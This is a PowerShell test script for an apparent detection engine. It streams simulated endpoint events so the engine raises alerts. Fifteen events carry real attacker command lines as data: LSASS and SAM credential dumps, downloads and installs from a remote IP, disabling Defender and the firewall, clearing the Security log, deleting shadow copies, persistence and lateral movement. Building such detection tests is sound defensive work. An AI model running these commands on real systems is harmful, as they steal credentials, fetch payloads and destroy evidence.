# ======================================================================
# security-framework - simulated sensor (PowerShell edition)
#
# Streams the exact same TTP scenario as the Go devsensor
# (cmd/devsensor/main.go) to the engine's NDJSON ingest port, but as a
# .ps1 script instead of a compiled exe. Reason: Windows Application
# Control / Smart App Control policies block unsigned binaries like
# bin\devsensor.exe, while powershell.exe is a signed system
# interpreter that those policies never block.
#
#   sf-devsensor                              (engine on 127.0.0.1:7777)
#   sf-devsensor -Addr 10.0.0.5:7777
#   sf-devsensor -IntervalMs 200
#   sf-devsensor -NoEngine                    (never auto-start the engine)
#
# If the engine is not listening, this script starts it in the
# background first (same mechanism as sf-console: hidden window,
# pid in run\engine.pid), so a single command demos the whole
# pipeline. The engine is left running afterwards - open sf-console
# to watch the alerts, or stop it with 'sf-console -Stop'.
#
# Expected result: 18 alerts (8 critical + 10 high) from 19 events
# (4 benign + 15 offensive), plus the 3 kill-chain sequences the
# engine correlates from them. Works on PowerShell 5.1+.
# ======================================================================
param(
    [string]$Addr = '127.0.0.1:7777',
    [int]$IntervalMs = 400,
    [switch]$NoEngine
)
$ErrorActionPreference = 'Stop'

$simHost = 'LAB-WKS-01'
$simUser = 'CORP\jdoe'

function New-SimEvent {
    param(
        [string]$Type,
        [hashtable]$Process,
        [hashtable]$Network,
        [switch]$Offensive
    )
    $ev = [ordered]@{
        id        = [Guid]::NewGuid().ToString()
        timestamp = (Get-Date).ToUniversalTime().ToString('o')
        type      = $Type
        source    = 'simulate'
        host      = $simHost
        user      = $simUser
    }
    if ($Process) { $ev['process'] = $Process }
    if ($Network) { $ev['network'] = $Network }
    if ($Offensive) { $ev['tags'] = @('ttp:offensive') }
    return $ev
}

function Get-SimDescription($ev) {
    if ($ev['process']) { return $ev['process']['name'] }
    if ($ev['network']) { return $ev['network']['domain'] }
    return '-'
}

# ---- scenario: must mirror cmd/devsensor/main.go ---------------------
$scenario = @(
    # benign baseline
    (New-SimEvent 'process.create' @{ pid = 4104; ppid = 812; name = 'explorer.exe'; image = 'C:\Windows\explorer.exe' }),
    (New-SimEvent 'process.create' @{ pid = 4212; ppid = 4104; name = 'notepad.exe'; command_line = '"C:\Windows\system32\NOTEPAD.EXE" C:\Users\jdoe\Documents\todo.txt'; image = 'C:\Windows\System32\notepad.exe' }),
    (New-SimEvent 'network.connect' $null @{ protocol = 'tcp'; source_ip = '10.0.4.42'; source_port = 51520; destination_ip = '142.250.200.36'; destination_port = 443; domain = 'www.google.com' }),
    # T1059.001 - PowerShell with encoded command (offensive)
    (New-SimEvent 'process.create' @{ pid = 6612; ppid = 4104; name = 'powershell.exe'; command_line = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
    # T1105 - certutil download (offensive)
    (New-SimEvent 'process.create' @{ pid = 6688; ppid = 4104; name = 'certutil.exe'; command_line = 'certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\Users\Public\payload.exe'; image = 'C:\Windows\System32\certutil.exe' } $null -Offensive),
    # T1218.005 - remote MSI installation (offensive)
    (New-SimEvent 'process.create' @{ pid = 6801; ppid = 6612; name = 'msiexec.exe'; command_line = 'msiexec.exe /q /i http://185.220.101.47/payload.msi'; image = 'C:\Windows\System32\msiexec.exe' } $null -Offensive),
    # T1003.001 - LSASS dump via comsvcs.dll (offensive)
    (New-SimEvent 'process.create' @{ pid = 6721; ppid = 6612; name = 'rundll32.exe'; command_line = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full'; image = 'C:\Windows\System32\rundll32.exe' } $null -Offensive),
    # T1003.001 - LSASS dump via signed procdump (offensive)
    (New-SimEvent 'process.create' @{ pid = 6845; ppid = 6612; name = 'procdump.exe'; command_line = 'procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass2.dmp'; image = 'C:\Windows\System32\procdump.exe' } $null -Offensive),
    # T1003.002 - SAM hive dump (offensive)
    (New-SimEvent 'process.create' @{ pid = 6834; ppid = 6612; name = 'reg.exe'; command_line = 'reg.exe save HKLM\SAM C:\Users\Public\sam.hiv'; image = 'C:\Windows\System32\reg.exe' } $null -Offensive),
    # T1053.005 - scheduled task persistence (offensive)
    (New-SimEvent 'process.create' @{ pid = 6733; ppid = 6612; name = 'schtasks.exe'; command_line = 'schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\schtasks.exe' } $null -Offensive),
    # T1547.001 - Run key persistence (offensive)
    (New-SimEvent 'process.create' @{ pid = 6777; ppid = 6612; name = 'reg.exe'; command_line = 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d C:\Users\Public\payload.exe /f'; image = 'C:\Windows\System32\reg.exe' } $null -Offensive),
    # T1047 - WMI process execution (offensive)
    (New-SimEvent 'process.create' @{ pid = 6744; ppid = 6612; name = 'wmic.exe'; command_line = 'wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\wbem\WMIC.exe' } $null -Offensive),
    # T1021.002 - lateral movement with PsExec (offensive)
    (New-SimEvent 'process.create' @{ pid = 6856; ppid = 6612; name = 'psexec.exe'; command_line = 'psexec.exe \\LAB-WKS-02 -accepteula -c C:\Users\Public\payload.exe'; image = 'C:\Windows\System32\psexec.exe' } $null -Offensive),
    # T1562.001 - Defender tampering (offensive)
    (New-SimEvent 'process.create' @{ pid = 6755; ppid = 6612; name = 'powershell.exe'; command_line = 'powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
    # T1562.004 - firewall impairment (offensive)
    (New-SimEvent 'process.create' @{ pid = 6812; ppid = 6612; name = 'netsh.exe'; command_line = 'netsh.exe advfirewall set allprofiles state off'; image = 'C:\Windows\System32\netsh.exe' } $null -Offensive),
    # T1070.001 - clear event logs (offensive)
    (New-SimEvent 'process.create' @{ pid = 6823; ppid = 6612; name = 'wevtutil.exe'; command_line = 'wevtutil.exe cl Security'; image = 'C:\Windows\System32\wevtutil.exe' } $null -Offensive),
    # T1218.010 - regsvr32 scriptlet execution (offensive)
    (New-SimEvent 'process.create' @{ pid = 6790; ppid = 6612; name = 'regsvr32.exe'; command_line = 'regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj'; image = 'C:\Windows\System32\regsvr32.exe' } $null -Offensive),
    # T1490 - inhibit recovery, VSS deletion (offensive)
    (New-SimEvent 'process.create' @{ pid = 6766; ppid = 6612; name = 'vssadmin.exe'; command_line = 'vssadmin.exe delete shadows /all /quiet'; image = 'C:\Windows\System32\vssadmin.exe' } $null -Offensive),
    # benign tail
    (New-SimEvent 'process.terminate' @{ pid = 4212; name = 'notepad.exe' })
)

# ---- resolve -Addr ----------------------------------------------------
$sep = $Addr.LastIndexOf(':')
if ($sep -lt 1) {
    Write-Host "[DEVSENSOR] invalid address '$Addr' (expected host:port)" -ForegroundColor Red
    exit 1
}
$ip = $Addr.Substring(0, $sep)
$port = 0
if (-not [int]::TryParse($Addr.Substring($sep + 1), [ref]$port)) {
    Write-Host "[DEVSENSOR] invalid port in '$Addr'" -ForegroundColor Red
    exit 1
}

# ---- resolve install root (installed: <root>\scripts\, repo: <root>\scripts\windows\) ----
$root = Split-Path -Parent $PSScriptRoot
if (-not (Test-Path (Join-Path $root 'bin'))) { $root = Split-Path -Parent $root }

# ---- auto-start the engine if it is down ------------------------------
function Test-EngineUp {
    $c = New-Object Net.Sockets.TcpClient
    try { $c.Connect($ip, $port); return $true } catch { return $false } finally { $c.Close() }
}

$engineWasStarted = $false
if (-not $NoEngine -and -not (Test-EngineUp)) {
    $engineExe = Join-Path $root 'bin\sf-engine.exe'
    if (-not (Test-Path $engineExe)) { $engineExe = Join-Path $root 'bin\engine.exe' }
    if (Test-Path $engineExe) {
        Write-Host '[DEVSENSOR] engine is not running - starting it in the background...'
        try {
            # -WindowStyle is Windows-only (pwsh on Unix rejects it)
            $spArgs = @{ FilePath = $engineExe; ArgumentList = "-rules `"$root\rules`""; PassThru = $true }
            if ([Environment]::OSVersion.Platform -eq [System.PlatformID]::Win32NT) { $spArgs['WindowStyle'] = 'Hidden' }
            $eng = Start-Process @spArgs
            New-Item -ItemType Directory -Path (Join-Path $root 'run') -Force | Out-Null
            Set-Content -Path (Join-Path $root 'run\engine.pid') -Value $eng.Id
            for ($i = 0; $i -lt 20; $i++) {
                Start-Sleep -Milliseconds 500
                if (Test-EngineUp) { $engineWasStarted = $true; break }
            }
            if ($engineWasStarted) {
                Write-Host '[DEVSENSOR] engine started (:7777 + api :7778)'
            } else {
                Write-Host '[DEVSENSOR] [!] engine did not come up on :7777' -ForegroundColor Yellow
            }
        } catch {
            Write-Host "[DEVSENSOR] [!] could not start the engine: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }
}

# ---- connect ----------------------------------------------------------
$client = New-Object Net.Sockets.TcpClient
try {
    $client.Connect($ip, $port)
} catch {
    Write-Host "[DEVSENSOR] cannot reach engine at ${Addr}: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host '[DEVSENSOR] hint: start the engine first:  sf-engine   (or simply  sf-console)'
    exit 1
}

$stream = $client.GetStream()
$writer = New-Object IO.StreamWriter($stream, (New-Object Text.UTF8Encoding($false)))
$writer.NewLine = "`n"

Write-Host "[DEVSENSOR] connected to $Addr - streaming $($scenario.Count) events"
$i = 0
try {
    foreach ($ev in $scenario) {
        $i++
        $json = $ev | ConvertTo-Json -Compress -Depth 6
        $writer.WriteLine($json)
        $writer.Flush()
        $marker = 'benign'
        if ($ev['tags'] -contains 'ttp:offensive') { $marker = 'OFFENSIVE' }
        Write-Host ('[DEVSENSOR] {0,2}/{1} {2,-9} {3,-18} {4}' -f $i, $scenario.Count, $marker, $ev['type'], (Get-SimDescription $ev))
        if ($i -lt $scenario.Count) { Start-Sleep -Milliseconds $IntervalMs }
    }
} finally {
    $writer.Dispose()
    $client.Close()
}
Write-Host '[DEVSENSOR] scenario complete - connection closed'
if ($engineWasStarted) {
    Write-Host '[DEVSENSOR] engine left running in the background:'
    Write-Host '[DEVSENSOR]   watch the alerts:  sf-console   (web UI)'
    Write-Host '[DEVSENSOR]   stop it:           sf-console -Stop'
}
